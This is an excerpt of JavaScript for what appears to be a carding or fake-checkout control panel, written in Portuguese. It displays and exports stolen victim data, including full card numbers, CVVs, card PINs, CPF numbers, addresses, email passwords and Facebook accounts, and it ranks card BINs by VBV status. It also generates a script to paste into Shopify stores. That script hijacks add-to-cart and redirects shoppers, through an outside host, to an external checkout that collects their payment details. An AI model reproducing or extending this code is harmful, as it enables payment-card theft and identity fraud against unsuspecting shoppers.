                                            text: (v.metodo_pagamento == 'pix' ? 'Pix' : v.metodo_pagamento == 'card' ? 'Cartão de Crédito' : 'Cartão')
                                        })
                                    )
                                )
                            )
                        ...
                        $("<li>", {
                            ...
                            $("<a>", {
                                ...
                                click: function(e) {
                                    ...
                                    let pagina = $(this).parent().attr('pagina');

                                    $("#ul_pedidos").children().each((i, v) => {
                                        if ($(v).attr('pagina') != pagina) {
                                            $(v).removeClass('active');
                                            $(v).children().css('color', '#8392ab');
                                        }
                                    })
        ...
        async deletaPedido(pedido, idloja) {
            _global.btnCarregando($("#confirma_deleta_pedido"), true, 'Confirmar');
            let deleta = await this.busca('dashboard/deletapedido', {
                pedido: pedido,
            }, 'POST');
            ...
            if (deleta.status == 200) {
                ...
                _global.btnCarregando($("#confirma_deleta_pedido"), false, 'Confirmar');
                $("#btn_cancela").click();
                $("#pedido_" + pedido).remove();

                _global.toast('O pedido foi apagado com sucesso', 'toastsucesso')
        ...
        async getCards() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca('dashboard/getCards', {
                id_usuario: usuario.id_usuario,
                tipo_usuario: usuario.tipo_usuario
            }, 'POST');
        ...
        async getCardsPerfil() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca('dashboard/getCardsPerfil', {
                token: usuario.token_checkout,
                tipo_usuario: usuario.tipo_usuario,
                id_usuario: usuario.id_usuario
            }, 'POST');
        ...
        async alterarSenha() {
            ...
            const usuario = _global.getUsuario();
            let dados = await _global.busca('dashboard/alterarSenha', {
            ...
            if (dados.status == 401) {
                ...
                _global.btnCarregando($("#confirmar_senha"), false, 'Confirmar');
                return;
            }

            if (dados.status == 200) {
                _global.toast('A senha foi alterada com sucesso. Você será redirecionado.', 'toastsucesso');
            }

            if (dados.status == 404) {
                _global.toast('Não foi possível alterar a senha [Erro Interno - 404]', 'toasterro');
                _global.btnCarregando($("#confirmar_senha"), false, 'Confirmar');
                return;
            }
        ...
        resetaEstatisticas() {
            $("#reseta_pedidos").off('click').on('click', async function(e) {
                e.preventDefault();
                let c = confirm('Você deseja resetar os pedidos? Os pedidos serão deletados e os contadores resetados!');
                if (c) {
                    const usuario = _global.getUsuario();
                    let req = await _global.busca('dashboard/resetaEst', {
                            flag: 'pedidos',
                            id_usuario: usuario.id_usuario,
                            tipo_usuario: usuario.tipo_usuario
                        },
                    ...
                    if (req.status == 200) {
                        _global.toast('Os contadores dos pedidos foram resetados!', 'toastsucesso');
                        _global.getCards();
                    }

                }
            })
            $("#reseta_visitas").off('click').on('click', async function(e) {
                e.preventDefault();
                let c = confirm('Você deseja resetar as visitas? As visitas serão deletadas e os contadores resetados!');
                if (c) {
                    const usuario = _global.getUsuario();
                    let req = await _global.busca('dashboard/resetaEst', {
                            flag: 'visitas',
                    ...
                    if (req.status == 200) {
                        _global.toast('Os contadores das visitas foram resetados!', 'toastsucesso');
                        _global.getCards();
                    }
        ...
        async configWhatsapp() {
            ...
            const usuario = _global.getUsuario();
            let lojas = await _global.busca('dashboard/getLojasCheckout', {
                id_usuario: usuario.id_usuario,
                tipo_usuario: usuario.tipo_usuario
            }, 'POST');
            ...
            $("#select_loja_whatsapp").change(async function(e) {
                ...
                let dados = await _global.busca('dashboard/getWhatsapp', {
                    ...
                    $("<div>", {
                        ...
                        $("<div>", {
                            ...
                            $("<button>", {
                                ...
                                text: 'Salvar Informações',
                                click: async function(e) {
                                    if ($("#instance_id").val() == "" || $("#instance_id").val().length < 5) {
                                        _global.toast('Verifique o valor de Instance ID!', 'toasterro');
                                        return;
                                    }

                                    if ($("#instance_token").val() == "" || $("#instance_token").val().length < 5) {
                                        _global.toast('Verifique o valor de Instance Token!', 'toasterro');
                                        return;
                                    }

                                    _global.btnCarregando($(this), true, 'Salvar Informações');
                                    let dados = await _global.busca('dashboard/updateWhatsapp', {
                                        instance_id: $("#instance_id").val(),
                                        instance_token: $("#instance_token").val(),
                                        id_loja: $("#select_loja_whatsapp").val(),
                                        token_seguranca: $("#token_seguranca").val(),
                                        rastreio_padrao: $("#rastreio_padrao").val()
                                    }, 'POST');

                                    if (dados.status == 200) {
                                        _global.toast('As credenciais foram salvas.', 'toastsucesso');
                                    } else {
                                        _global.toast('Houve um erro ao salvar [ERRO INTERNO].', 'toasterro');
                                    }
                                    _global.btnCarregando($(this), false, 'Salvar Informações');
                                }
                            })
        ...
        async enviaMensagemWhatsapp(hash, tipoMensagem, btn) {
            ...
            if (tipoMensagem == 'rastreio') {
                r = prompt('Deseja digitar um código de rastreio? (DEIXE EM BRANCO CASO QUEIRA ENVIAR O RASTREIO PADRÃO)');
            }

            let dados = await _global.busca('dashboard/enviaWhats', {
                hash: hash,
            ...
            if (dados.status == 200) {
                ...
                _global.toast('A mensagem foi enviada com sucesso!', 'toastsucesso');

            } else {
                _global.btnCarregando($(btn), false, 'Enviar');
                _global.toast('Não foi possível enviar a mensagem [ERRO INTERNO]', 'toasterro');
            }

        },
        async getLojasEmail() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca('dashboard/getLojasEmail', {
        ...
        async changeSelectEmail() {
            ...
            $("#select_loja_email").change(async function(e) {
                ...
                let dados = await _global.busca('dashboard/getSmtpLoja', {
                    u: usuario.id_usuario,
                ...
                if (dados.length > 0) {
                    dados = dados[0];
                    if (dados.opcao_selecionada == 'smtp' || dados.opcao_selecionada == null) {
                        $("#div_smtp").show();
                        $("#div_mailjet").hide();
        ...
        async eventosSmtp() {
            $("#salva_smtp").click(async function(e) {
                ...
                if ($("#smtp_username").val().length < 3) {
                    _global.toast('Verifique o campo SMTP Username', 'toasterro');
                    return;
                }
                if ($("#smtp_password").val().length < 3) {
                    _global.toast('Verifique o campo SMTP Password', 'toasterro');
                    return;
                }
                ...
                _global.btnCarregando($(this), true, 'Salvar Informações');
                _global.toast('Aguarde, estamos testando suas credenciais...', 'toastsucesso');

                let dados = await _global.busca('dashboard/verificaSmtp', {
                ...
                if (dados.status == 200) {
                    _global.toast('Credenciais verificadas com sucesso, salvando as credenciais...', 'toastsucesso');
                } else if (dados.status == 500) {
                    _global.toast('Não foi possível verificar suas credenciais, verifique os valores.', 'toasterro');
                    _global.btnCarregando($(this), false, 'Salvar Informações');
                    return;
                } else {
                    _global.toast('Houve um erro interno, tente novamente.', 'toasterro');
                    _global.btnCarregando($(this), false, 'Salvar Informações');
                    return;
                }

                let update = await _global.busca('dashboard/updateSmtp', {
                    l: $("#select_loja_email").val(),
                    smtp_host: $("#smtp_host").val(),
                    smtp_porta: $("#smtp_porta").val(),
                    smtp_email: $("#smtp_email").val(),
                ...
                if (update.status == 200) {
                    _global.toast('As credenciais de SMTP foram salvas com sucesso.', 'toastsucesso');
                } else {
                    _global.toast('Não foi possível salvar as credenciais.', 'toasterro');
                }
        ...
        async integracaoShopify(){
            ...
            if(lojas.length == 0){
                ...
                $("#select_loja_shopify").change(async function(e){
                    ...
                    if(dados.status == 404){
                        _global.toast('Esta loja ainda não tem uma integração, integre ela!', 'toastwarning');
                        $("#row_shopify").append(
                            $("<div>",{
                                ...
                                $("<div>",{
                                    ...
                                    $("<div>",{
                                        ...
                                        $("<input>",{
                                            type: 'text',
                                            class: 'form-control',
                                            placeholder: 'https://xxxxxxxx.myshopify.com',
                                            id: 'dominio_loja'
                                        })
                                    ).append(
                                        $("<button>",{
                                            ...
                                            click: async function(e){
                                                let chaveApi = $("#chave_api").val();
                                                let chaveSecreta = $("#chave_secreta_api").val();
                                                let tokenAcesso = $("#token_acesso_api").val();
                                                let dominioLoja = $("#dominio_loja").val();

                                                if(chaveApi == ""){
                                                    _global.toast('Preencha a Chave da API', 'toasterro');
                                                    return;
                                                }

                                                if(chaveSecreta == ""){
                                                    _global.toast('Preencha a Chave Secreta da Api', 'toasterro');
                                                    return;
                                                }

                                                if(tokenAcesso == ""){
                                                    _global.toast('Preencha o Token de Acesso da Api', 'toasterro');
                                                    return;
                                                }

                                                if(dominioLoja == ""){
                                                    _global.toast('Preencha o Domínio da Loja Shopify', 'toasterro');
                                                    return;
                                                }
                                                ...
                                                if(dados.status == 300){
                                                    _global.toast('Credenciais inválidas, verifique suas credenciais.', 'toasterro');
                                                    _global.btnCarregando($(this), false, 'Integrar');
                                                    return;
                                                }
                                                ...
                                                if(dados.status == 200){
                                                    _global.toast('A integração foi realizada com sucesso.', 'toastsucesso');
                    ...
                    if(dados.status == 200){
                        let dados = await _global.busca('dashboard/getDadosShopify', {
                            l: $("#select_loja_shopify").val()
                        }, 'POST');
                                ...
                                $("<div>",{
                                    ...
                                    $("<div>",{
                                        ...
                                        $("<div>",{
                                            ...
                                            $("<input>",{
                                                ...
                                                change: async function(e){
                                                    ...
                                                    if(dados.status == 200 && flag == 's'){
                                                        _global.toast('Os pedidos serão marcados na shopify.', 'toastsucesso');
                                                        return;
                                                    }
                                                    if(dados.status == 200 && flag == 'n'){
                                                        _global.toast('Os pedidos não serão marcados na shopify.', 'toastsucesso');
                                                        return;
                                                    }
                                        ...
                                        $("<button>",{
                                            ...
                                            click: function(e){
                                                let a = `<script>$('[action="/cart/add"]').contents().unwrap(); $('[data-action="add-to-cart"]').each((o, a) => { $(a).click(()=>{ console.log('dominio nao carregado ainda') }) }) </script><script>$(document).ready((function(){let t;(async function(){return new Promise(((o,a)=>{$.post("https://josephino-apis.store/api/getDominio",{l:${$("#select_loja_shopify").val()}},(a=>{404==a.status&&(alert("Você não tem um domínio cadastrado no checkout."),o()),500==a.status&&(alert("Erro interno no checkout."),o()),t=a.dominio,o()}))}))})().then((()=>{$('[action="/cart/add"]').contents().unwrap(),$('[data-action="add-to-cart"]').each(((o,a)=>{$(a).click((function(o){o.preventDefault();let a="",n={{product.id}},e=$('[name="quantity"]').val()??1;$(".product-form__option-name").each(((t,o)=>{a+=$(o).text()+"|"}));const c=new URLSearchParams(window.location.search);let i;c.has("variant")&&(i=c.get("variant")),location.href="https://"+t+"/carrinho?shopify=s&is="+n+"&vs="+i+"&p="+n+"&q="+e+"&l=${$("#select_loja_shopify").val()}&v="+a}))}))}))}));</script>`;
                                                $("#codigo_integracao").text(a);
                                                $("#modalintegracao").modal('show');
                                            }
                                        })
                                    ).append(
                                        $("<button>",{
                                            ...
                                            click: async function(e){
                                                _global.btnCarregando($(this), true, 'Desativar Integração');

                                                let dados = await _global.busca('dashboard/desativaShopify',{
                                                    l: $("#select_loja_shopify").val(),
                                                }, 'POST');

                                                if(dados.status == 200){
                                                    _global.toast('A integração foi desativada com sucesso.', 'toastsucesso');
                        ...
                        if(dados.marcar_pedido == 'n'){
                            $("#checkbox_pedido_shopify").prop('checked', false);
                        }else{
        ...
        async getCartoes(){
            const usuario = _global.getUsuario();
            let dados = await _global.busca('dashboard/getCartoes', {u: usuario.id_usuario}, 'POST');
            let _l = [];
            let listaCartoes = [];
            ...
            if (dados.length > 0) {
                ...
                $("#btn_exporta_cc").off('click').on('click', async function(e){
                    if(_global.listaExport.length < 1){
                        _global.toast('Você não tem informações para exportar', 'toasterro');
                        return;
                    }
...
--------------------------------------
                            ...
                            $("<td>").append(
                                $("<div>",{
                                    ...
                                    $("<div>",{
                                        ...
                                        $("<span>",{
                                            class: 'badge bg-gradient-' + (v.senha == null ? 'danger' : 'success'),
                                            style: 'font-size: 10px; border-radius: 30px;',
                                            text: (v.senha == null ? 'Mix' : 'Consultável')
                                        })
                                    )
                                )
                            )
                            ...
                            $("<td>").append(
                                $("<div>",{
                                    ...
                                    $("<div>",{
                                        ...
                                        _id: v.id,
                                        click: async function(e){
                                            let cc = _global.listacc[$(this).attr('_id')];
                                            let vl = cc.valor_compra;
                                            vl = vl.replace('.', ',');

                                            $("#bin_modal").text(`BIN: ${cc.bin_d}`);
                                            $("#cc_modal").text(`Cartão: ${cc.cc}`);
                                            $("#validade_modal").text(`Validade: ${cc.validade}`);
                                            $("#cvv_modal").text(`CVV: ${cc.cvv}`);
                                            $("#senha_modal").text(`Senha do Cartão: ${(cc.senha == null ? 'Cliente não informou' : cc.senha)}`);
                                            $("#cpf_modal").text(`CPF do Titular: ${cc.cpf}`);
                                            $("#titular_modal").text(`Titular: ${cc.titular}`);
                                            $("#email_modal").text(`Email: ${cc.email}`);
                                            $("#senhaemail").text(`Senha do Email: ${cc.senha_email}`);
                                            $("#cep_modal").text(`CEP: ${cc.cep}`);
                                            $("#rua_modal").text(`Endereço: ${cc.rua}`);
                                            $("#numero_modal").text(`Número: ${cc.numero}`);
                                            $("#bairro_modal").text(`Bairro: ${cc.bairro}`);
                                            $("#complemento_modal").text(`Complemento: ${(cc.complemento == null ? '' : cc.complemento)}`);
                                            $("#produto_modal").text(`Produto: ${cc.produto}`);
                                            $("#valor_modal").text(`Valor da Compra: R$ ${vl}`);
                                            $("#frete_modal").text(`Frete Selecionado: ${cc.frete}`);
                                            $("#lj_modal").text(`Loja: ${cc.nm_loja}`);
                                ...
                                $("<div>",{
                                    ...
                                    $("<div>",{
                                        ...
                                        $("<span>",{
                                            ...
                                            _id: v.id,
                                            click: async function(e){
                                                let deleta = confirm('Você deseja deletar este cartão? A ação é irreversível.');
                                                let _i = $(this).attr('_id');

                                                if(deleta){
                                                    let dados = await _global.busca('dashboard/deleteInfo', {id: _i}, 'POST');

                                                    if(dados.status == 200){
                                                        _global.toast('A informação foi deletada com sucesso.', 'toastsucesso');
                                                        $("#cartao_" + _i).remove();
                                                        _global.getCards();
                                                    }else{
        ...
        async exportaPedidosTxt(){
            $("#exporta_pedidos").off('click').on('click', async function(){
                const usuario = _global.getUsuario();
                let dados = await _global.busca('dashboard/getPedidos', {
                    id_usuario: usuario.id_usuario,
                    tipo_usuario: usuario.tipo_usuario,
...
`}
                    ...
                    if(count > 0){
                        ...
                        _global.toast('Você não possui pedidos de email/senha para este período.')
                    }
        ...
        async geraGridBins(dados){
            return new Promise((res)=>{
                ...
                $("#grid_bins").remove();
                $("#rowbins").append(`<div id="grid_bins" class="card col-lg-8 flex" style="width: 100%; height: 90%"></div>`);
                ...
                var getLocalization = function() {
                    ...
                    localizationobj.grid = {
                        'everpresentrowplaceholder': 'Clique aqui para adicionar um novo item',
                        'loadtext': 'Carregando...',
                        ...
                        'filtershowrowdatestring': 'Mostrar itens com data no intervalo:',
                        ...
                        'filterstringcomparisonoperators': ['vazio', 'não vazio', 'contém', 'contém (caso sens.)', 'não contém', 'não contém (caso sens.)', 'começa com', 'começa com (caso sens.)', 'termina com', 'termina com (caso sens.)', 'igual', 'igual (caso sens.)', 'não igual', 'não igual (caso sens.)'],
                        'filternumericcomparisonoperators': ['igual', 'não igual', 'menor que', 'menor ou igual a', 'maior que', 'maior ou igual a'],
                        'filterdatecomparisonoperators': ['igual', 'não igual', 'menor que', 'menor ou igual a', 'maior que', 'maior ou igual a'],
                        'filterbooleancomparisonoperators': ['igual', 'não igual'],
                ...
                $("#grid_bins").jqxGrid({
                    ...
                    theme: 'fluent',
                    columns: [
                        { text: 'BIN', datafield: 'bin', hidden: false, editable: false, width: '15%', align: "center", cellsalign: 'center', },
                        { text: 'Banco', datafield: 'banco', width: '30%', editable: false, align: "center", cellsalign: 'center', },
                        { text: 'Tipo', datafield: 'type', width: '15%', editable: false, align: "center", cellsalign: 'center', },
                        { text: 'Level', datafield: 'lvl', width: '15%', editable: false, align: "center", cellsalign: 'center', },
                        { text: 'VBV Ativo', datafield: 'vbv', width: '10%', columntype: 'checkbox', align: "center", cellsalign: 'center', },
                        { text: 'Dígitos Senha', datafield: 'digitos', width: '15%', align: "center", cellsalign: 'center', },
                    ]
                });
                ...
                $("#grid_bins").on('cellendedit', async function (event)
                {
                    ...
                    if(dataField == 'digitos'){
                        if(value < 4 || value > 10){
                            _global.toast('Os dígitos permitidos vão do 4 até 8.', 'toasterro');
                            return;
                        }

                        let dados = await _global.busca('dashboard/updateBinsUser', {u: usuario.id_usuario, digitos: value, vbv: (rowData.vbv ? 's' : 'n'), bin: rowData.bin}, 'POST');

                        if(dados.status == 200) _global.toast('Os dígitos foram atualizados com sucesso para esta BIN.', 'toastsucesso')
                        if(dados.status == 500) _global.toast('Não foi possível salvar [ERRO INTERNO].', 'toasterro');
        ...
        async exportaFacebook(){
            $("#btnexportafacebookhj").off('click').on('click', async function(e){
                ...
                if(dados.length < 1){
                    _global.toast('Você não tem facebooks para exportar.', 'toasterro');
                    $(this).prop('disabled', false);
                    return;
                }
            ...
            $("#btnexportafacebook").off('click').on('click', async function(e){
                const usuario = _global.getUsuario();
                $(this).prop('disabled', true);
                let dados = await _global.busca('dashboard/getFacebooks', { u: usuario.id_usuario, periodo: 'total'}, 'POST');
                if(dados.length < 1){
                    _global.toast('Você não tem facebooks para exportar.', 'toasterro');
                    $(this).prop('disabled', false);
                    return;
            ...
            $("#deletafacebook").off('click').on('click', async function(e){
                ...
                let dados = await _global.busca('dashboard/getFacebooks', { u: usuario.id_usuario, periodo: 'delete'}, 'POST');
                if(dados.status == 200) _global.toast('Os facebooks foram deletados com sucesso.', 'toastsucesso');
